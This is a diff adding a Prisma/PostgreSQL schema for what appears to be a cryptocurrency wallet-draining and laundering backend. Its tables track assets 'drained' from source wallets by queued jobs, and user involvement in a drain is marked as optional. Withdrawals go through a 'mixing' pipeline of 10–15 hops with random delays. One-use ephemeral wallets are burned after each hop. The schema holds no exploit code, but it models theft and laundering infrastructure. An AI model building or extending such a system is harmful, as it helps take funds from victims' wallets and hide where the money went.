@@ -1,0 +1,138 @@
+generator client {
+  provider = "prisma-client-js"
+}
+
+datasource db {
+  provider = "postgresql"
+  url      = env("DATABASE_URL")
+}
+
+model User {
+  id                String             @id @default(uuid())
+  email             String             @unique
+  passwordHash      String
+  name              String?
+  createdAt         DateTime           @default(now())
+  updatedAt         DateTime           @updatedAt
+  custodialWallets  CustodialWallet[]
+  withdrawalRequests WithdrawalRequest[]
+  
+  @@map("users")
+}
+
+model CustodialWallet {
+  id                    String       @id @default(uuid())
+  userId                String
+  user                  User         @relation(fields: [userId], references: [id], onDelete: Cascade)
+  network               String       // 'ethereum', 'solana', 'bsc', 'polygon', etc.
+  address               String
+  encryptedPrivateKey   String       @db.Text
+  derivationPath        String
+  createdAt             DateTime     @default(now())
+  heldAssets            HeldAsset[]
+  
+  @@unique([userId, network])
+  @@map("custodial_wallets")
+}
+
+model HeldAsset {
+  id                String           @id @default(uuid())
+  walletId          String
+  wallet            CustodialWallet  @relation(fields: [walletId], references: [id], onDelete: Cascade)
+  assetAddress      String           // Token contract or 'native' for native coin
+  symbol            String
+  name              String?
+  decimals          Int
+  amount            String           // Use string to avoid precision loss
+  usdValue          Decimal?         @db.Decimal(18, 2)
+  drainedFrom       String           // Original source wallet address
+  drainJobId        String?          // Reference to Bull job ID
+  drainDate         DateTime         @default(now())
+  status            String           @default("held") // 'held', 'withdrawn', 'pending_withdrawal'
+  
+  @@index([walletId])
+  @@index([status])
+  @@map("held_assets")
+}
+
+model WithdrawalRequest {
+  id                String        @id @default(uuid())
+  userId            String
+  user              User          @relation(fields: [userId], references: [id], onDelete: Cascade)
+  network           String
+  assetAddress      String
+  symbol            String
+  amount            String
+  destinationAddress String
+  status            String        @default("pending") // 'pending', 'mixing', 'completed', 'failed'
+  hopsCompleted     Int           @default(0)
+  totalHops         Int           @default(10) // 10-15 hops for maximum privacy
+  estimatedGasCost  Decimal?      @db.Decimal(18, 8)
+  actualGasCost     Decimal?      @db.Decimal(18, 8)
+  requestedAt       DateTime      @default(now())
+  startedAt         DateTime?
+  completedAt       DateTime?
+  error             String?       @db.Text
+  mixingHops        MixingHop[]
+  
+  @@index([userId])
+  @@index([status])
+  @@map("withdrawal_requests")
+}
+
+model MixingHop {
+  id                    String            @id @default(uuid())
+  withdrawalRequestId   String
+  withdrawalRequest     WithdrawalRequest @relation(fields: [withdrawalRequestId], references: [id], onDelete: Cascade)
+  hopNumber             Int               // 1, 2, 3, ... up to 15
+  fromAddress           String
+  toAddress             String
+  amount                String
+  txHash                String?
+  blockNumber           Int?
+  gasUsed               Decimal?          @db.Decimal(18, 8)
+  delaySeconds          Int               // Random delay before this hop
+  status                String            @default("pending") // 'pending', 'processing', 'completed', 'failed'
+  createdAt             DateTime          @default(now())
+  executedAt            DateTime?
+  error                 String?           @db.Text
+  
+  @@index([withdrawalRequestId])
+  @@map("mixing_hops")
+}
+
+model DrainHistory {
+  id                String    @id @default(uuid())
+  userId            String?   // Optional - if user-initiated
+  sourceAddress     String
+  destinationAddress String   // Custodial wallet address
+  network           String
+  jobId             String    @unique // Bull job ID
+  status            String    // 'queued', 'processing', 'completed', 'failed'
+  totalAssets       Int       @default(0)
+  successfulTransfers Int     @default(0)
+  failedTransfers   Int       @default(0)
+  totalValueUsd     Decimal?  @db.Decimal(18, 2)
+  createdAt         DateTime  @default(now())
+  completedAt       DateTime?
+  error             String?   @db.Text
+  
+  @@index([userId])
+  @@index([sourceAddress])
+  @@index([status])
+  @@map("drain_history")
+}
+
+model EphemeralWallet {
+  id                String    @id @default(uuid())
+  network           String
+  address           String    @unique
+  encryptedPrivateKey String  @db.Text
+  usedInHopId       String?   // Reference to MixingHop
+  createdAt         DateTime  @default(now())
+  usedAt            DateTime?
+  burned            Boolean   @default(false) // Mark as burned after use
+  
+  @@index([burned])
+  @@map("ephemeral_wallets")
+}
